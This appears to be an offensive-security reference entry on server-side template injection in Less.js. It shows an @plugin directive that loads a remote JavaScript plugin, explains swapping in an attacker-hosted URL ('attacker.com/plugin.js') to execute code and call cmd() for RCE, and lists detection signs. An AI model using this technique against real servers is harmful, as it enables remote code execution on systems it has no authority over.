---
type: code
language: less
verified: true
created_at: '2023-04-06T03:56:40.037490+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - Node.js
tags:
  - ssti
  - less.js
  - directive
validated: true
---

# less-remote-plugin-directive

## Code

```less
// example remote plugin usage
@plugin "http://example.com/plugin-2.7.js"
```

## Description

This Less code snippet uses the @plugin directive to import a remote JavaScript plugin during compilation. In the context of SSTI exploitation, replace the URL with an attacker-controlled malicious plugin to execute arbitrary code on the server processing the Less file.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| URL | Remote URL hosting the plugin.js file | http://attacker.com/plugin.js |

## Usage

Embed this directive at the top of a .less file and submit to a vulnerable Less.js processor (e.g., via file upload or API). Follow with invocations of functions defined in the plugin, such as cmd() for RCE. Used in web applications allowing dynamic CSS styling.

## Detection

- Network logs showing fetches to unexpected external domains during CSS processing.
- Less compilation logs with @plugin directives or JavaScript execution traces.
- Anomalous child_process spawns triggered by plugin code.

## Related

- [[procedures/Exploit-SSTI-in-Less.js-Plugins-for-RCE]]
- [[commands/less-import-remote-plugin]]
